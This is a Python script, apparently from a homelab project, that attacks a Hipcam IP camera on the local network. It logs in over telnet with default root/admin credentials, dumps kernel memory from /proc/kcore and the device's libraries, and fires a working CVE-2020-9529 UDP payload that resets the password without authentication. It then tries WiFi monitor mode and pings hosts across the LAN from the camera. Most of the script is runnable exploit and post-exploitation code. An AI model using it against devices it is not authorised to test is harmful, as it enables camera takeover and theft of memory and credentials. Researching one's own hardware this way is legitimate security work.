#!/usr/bin/env python3
"""
Hipcam IP camera live data collection script.
Connects via telnet (root / admin) at 192.168.1.10 and runs
multiple data collection tasks sequentially, saving all output.

Tasks:
  1. Copy shared libraries from tmpfs to /tmp/ and download via HTTP
  2. Dump /proc/kcore kernel memory
  3. Test CVE-2020-9529 (unauthenticated password reset via UDP)
  4. Check active network connections
  5. Check WiFi monitor mode capability
  6. Quick LAN scan from camera
  7. Final cleanup
"""

import os
import subprocess
import sys
import telnetlib
import time
import socket

HOST = "192.168.1.10"
USER = "root"
PASSWORD = "admin"
OUTDIR = "/home/hiago/repositories/homelab/camera/dumps/live"

# Ensure output directory exists
os.makedirs(OUTDIR, exist_ok=True)


def log(msg: str) -> None:
    print(f"[*] {msg}")


def tcmd(tn: telnetlib.Telnet, cmd: str, timeout: float = 10.0) -> str:
    """Send a command via telnet and return output as string."""
    tn.write(cmd.encode() + b"\n")
    time.sleep(0.3)
    try:
        data = tn.read_until(b"# ", timeout=timeout)
        output = data.decode(errors="replace")
        return output
    except Exception:
        data = tn.read_very_eager()
        return data.decode(errors="replace")


def save_output(filename: str, content: str) -> str:
    path = os.path.join(OUTDIR, filename)
    with open(path, "w") as f:
        f.write(content)
    log(f"Saved: {filename} ({len(content)} bytes)")
    return path


def connect_telnet() -> telnetlib.Telnet:
    log(f"Connecting to {HOST}:23 ...")
    tn = telnetlib.Telnet(HOST, 23, timeout=15)
    tn.read_until(b"login: ", timeout=10)
    tn.write(USER.encode() + b"\n")
    tn.read_until(b"Password: ", timeout=10)
    tn.write(PASSWORD.encode() + b"\n")
    time.sleep(0.5)
    tn.read_until(b"# ", timeout=10)
    # Flush any remaining welcome banner
    tn.write(b"\n")
    time.sleep(0.3)
    tn.read_until(b"# ", timeout=5)
    log("Connected successfully.")
    return tn


# ──────────────────────────────────────────────
# TASK 1: Copy shared libraries and download
# ──────────────────────────────────────────────
def task1_copy_libs(tn: telnetlib.Telnet) -> None:
    log("── Task 1: Copy shared libraries from tmpfs ──")

    libs = ["libNetLib.so", "libXqAPILib.so", "libxqun.so"]
    results = []

    for lib in libs:
        src = f"/mnt/mtd/ipc/tmpfs/{lib}"
        dst = f"/tmp/{lib}"
        log(f"  Copying {lib} ...")
        out = tcmd(tn, f"cp {src} {dst} && echo OK || echo FAIL")
        results.append(f"--- {lib} ---\n{out}")
        log(f"    {out.strip().splitlines()[-1] if out.strip() else 'no output'}")

    save_output("task1_copy_libs_output.txt", "\n".join(results))

    # Download via HTTP from our machine
    log("  Downloading libraries via HTTP from camera ...")
    for lib in libs:
        url = f"http://{HOST}/tmpfs/{lib}"
        dest = os.path.join(OUTDIR, lib)
        log(f"    Fetching {url} -> {dest}")
        try:
            r = subprocess.run(
                ["curl", "-s", "-o", dest, "-w", "%{http_code} %{size_download}", url],
                capture_output=True, text=True, timeout=30
            )
            log(f"    HTTP {r.stdout.strip() or r.returncode}")
        except Exception as e:
            log(f"    FAILED: {e}")


# ──────────────────────────────────────────────
# TASK 2: Memory dump /proc/kcore
# ──────────────────────────────────────────────
def task2_memory_dump(tn: telnetlib.Telnet) -> None:
    log("── Task 2: Memory dump /proc/kcore ──")

    out = tcmd(tn, "ls -la /proc/kcore 2>&1; cat /proc/kcore > /tmp/kcore.dump 2>&1 && echo OK || echo FAIL", timeout=60)
    save_output("task2_kcore_copy_output.txt", out)
    log(f"  Copy output: {out.strip().splitlines()[-1] if out.strip() else 'no output'}")

    # Check size
    out2 = tcmd(tn, "ls -la /tmp/kcore.dump 2>&1")
    log(f"  kcore.dump size: {out2.strip().splitlines()[-1] if out2.strip() else 'N/A'}")

    # Download
    url = f"http://{HOST}/tmpfs/kcore.dump"
    dest = os.path.join(OUTDIR, "kcore.dump")
    log(f"  Downloading {url} ...")
    try:
        r = subprocess.run(
            ["curl", "-s", "-o", dest, "-w", "%{http_code} %{size_download}", url],
            capture_output=True, text=True, timeout=90
        )
        log(f"  HTTP {r.stdout.strip() or r.returncode}")
    except Exception as e:
        log(f"  FAILED: {e}")

    # Remove from camera
    log("  Removing /tmp/kcore.dump from camera ...")
    out3 = tcmd(tn, "rm -f /tmp/kcore.dump && echo OK || echo FAIL")
    log(f"    {out3.strip().splitlines()[-1] if out3.strip() else 'no output'}")


# ──────────────────────────────────────────────
# TASK 3: Test CVE-2020-9529
# ──────────────────────────────────────────────
def task3_cve_test(tn: telnetlib.Telnet) -> None:
    log("── Task 3: Test CVE-2020-9529 ──")

    results = []

    # Get current password hash for restoration
    log("  Getting current user attributes for backup ...")
    orig_attrs = subprocess.run(
        ["curl", "-s", "-u", f"{USER}:{PASSWORD}",
         f"http://{HOST}/cgi-bin/hi3510/param.cgi?cmd=getuserattr"],
        capture_output=True, text=True, timeout=15
    )
    results.append(f"--- Original user attrs (before reset) ---\n{orig_attrs.stdout}")
    log(f"  Original attrs: {orig_attrs.stdout.strip()[:200]}")

    # Send CVE-2020-9529 payload via UDP
    log("  Sending CVE-2020-9529 password reset via UDP port 12222 ...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        sock.sendto(b'CMD * HDS/1.0\r\nusrpwd set -resetpwd on\r\n\r\n', (HOST, 12222))
        try:
            resp, addr = sock.recvfrom(4096)
            resp_text = resp.decode(errors="replace")
            log(f"  UDP response: {resp_text.strip()}")
            results.append(f"--- CVE-2020-9529 UDP response ---\n{resp_text}")
        except socket.timeout:
            log("  No UDP response (timeout) - this may still have worked")
            results.append("--- CVE-2020-9529 UDP response: TIMEOUT ---")
        sock.close()
    except Exception as e:
        log(f"  UDP send FAILED: {e}")
        results.append(f"--- CVE-2020-9529 UDP error: {e} ---")

    # Wait a moment for the reset to take effect
    time.sleep(2)

    # Test if admin:admin works
    log("  Testing admin:admin credentials ...")
    test_res = subprocess.run(
        ["curl", "-s", "-u", "admin:admin",
         f"http://{HOST}/cgi-bin/hi3510/param.cgi?cmd=getuserattr"],
        capture_output=True, text=True, timeout=15
    )
    results.append(f"--- Test with admin:admin ---\n{test_res.stdout}")
    if test_res.returncode == 0 and test_res.stdout.strip():
        log(f"  CVE-2020-9529 CONFIRMED! admin:admin works: {test_res.stdout.strip()[:200]}")
        log("  Restoring original admin password via setuserattr ...")

        # Restore password to admin
        restore_res = subprocess.run(
            ["curl", "-s", "-u", "admin:admin",
             f"http://{HOST}/cgi-bin/hi3510/param.cgi?cmd=setuserattr&-userattr&admin:0:admin:Administrator"],
            capture_output=True, text=True, timeout=15
        )
        results.append(f"--- Restore password response ---\n{restore_res.stdout}")
        log(f"  Restore response: {restore_res.stdout.strip()[:200]}")

        # Verify restoration
        time.sleep(1)
        verify_res = subprocess.run(
            ["curl", "-s", "-u", f"{USER}:{PASSWORD}",
             f"http://{HOST}/cgi-bin/hi3510/param.cgi?cmd=getuserattr"],
            capture_output=True, text=True, timeout=15
        )
        results.append(f"--- Verify after restore ---\n{verify_res.stdout}")
        log(f"  Verify original creds: {'OK' if verify_res.stdout.strip() else 'FAIL'}")
    else:
        log("  CVE-2020-9529: admin:admin did NOT work (already patched or not vulnerable)")

    save_output("task3_cve2020_9529.txt", "\n\n".join(results))


# ──────────────────────────────────────────────
# TASK 4: Active network connections
# ──────────────────────────────────────────────
def task4_network_connections(tn: telnetlib.Telnet) -> None:
    log("── Task 4: Network connections ──")

    results = []

    out1 = tcmd(tn, "netstat -tlnp 2>&1", timeout=15)
    results.append(f"--- netstat -tlnp ---\n{out1}")
    log(f"  netstat -tlnp: {len(out1)} bytes")

    out2 = tcmd(tn, "netstat -an 2>&1 | grep ESTABLISHED", timeout=15)
    results.append(f"--- netstat -an | grep ESTABLISHED ---\n{out2}")
    log(f"  netstat ESTABLISHED: {len(out2)} bytes")

    save_output("task4_network_connections.txt", "\n".join(results))


# ──────────────────────────────────────────────
# TASK 5: WiFi monitor mode capability
# ──────────────────────────────────────────────
def task5_wifi_monitor(tn: telnetlib.Telnet) -> None:
    log("── Task 5: WiFi monitor mode ──")

    results = []

    out1 = tcmd(tn, "iwconfig ra0 2>&1", timeout=15)
    results.append(f"--- iwconfig ra0 ---\n{out1}")

    out2 = tcmd(tn, "iwpriv ra0 2>&1", timeout=15)
    results.append(f"--- iwpriv ra0 ---\n{out2}")

    out3 = tcmd(tn, "iwconfig ra0 mode monitor 2>&1", timeout=15)
    results.append(f"--- iwconfig ra0 mode monitor ---\n{out3}")

    # Check if any wlan interface exists with a different name
    out4 = tcmd(tn, "iwconfig 2>&1", timeout=15)
    results.append(f"--- iwconfig (all) ---\n{out4}")

    save_output("task5_wifi_monitor.txt", "\n\n".join(results))
    log("  WiFi info saved.")


# ──────────────────────────────────────────────
# TASK 6: LAN scan from camera
# ──────────────────────────────────────────────
def task6_lan_scan(tn: telnetlib.Telnet) -> None:
    log("── Task 6: LAN scan ──")

    results = []

    out1 = tcmd(tn, "arp -a 2>&1", timeout=15)
    results.append(f"--- arp -a ---\n{out1}")

    for ip in ["192.168.1.1", "192.168.1.2", "192.168.1.4"]:
        out = tcmd(tn, f"ping -c 1 {ip} 2>&1", timeout=10)
        results.append(f"--- ping {ip} ---\n{out}")
        log(f"  ping {ip}: {'alive' if '1 received' in out else 'no response'}")

    save_output("task6_lan_scan.txt", "\n\n".join(results))


# ──────────────────────────────────────────────
# TASK 7: Cleanup
# ──────────────────────────────────────────────
def task7_cleanup(tn: telnetlib.Telnet) -> None:
    log("── Task 7: Cleanup ──")

    rm_cmd = "rm -f /tmp/libNetLib.so /tmp/libXqAPILib.so /tmp/libxqun.so /tmp/kcore.dump && echo OK || echo FAIL"
    out = tcmd(tn, rm_cmd, timeout=10)
    log(f"  Cleanup: {out.strip().splitlines()[-1] if out.strip() else 'no output'}")
    save_output("task7_cleanup.txt", out)


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
def main() -> None:
    log(f"Starting live data collection from {HOST}")
    log(f"Output directory: {OUTDIR}")

    tn = None
    try:
        tn = connect_telnet()

        task1_copy_libs(tn)
        task2_memory_dump(tn)
        task3_cve_test(tn)   # also uses subprocess (curl), not telnet
        task4_network_connections(tn)
        task5_wifi_monitor(tn)
        task6_lan_scan(tn)
        task7_cleanup(tn)

        log("All tasks completed successfully.")

    except Exception as e:
        log(f"ERROR: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    finally:
        if tn:
            try:
                tn.write(b"exit\n")
                tn.close()
            except Exception:
                pass
        log("Connection closed.")


if __name__ == "__main__":
    main()
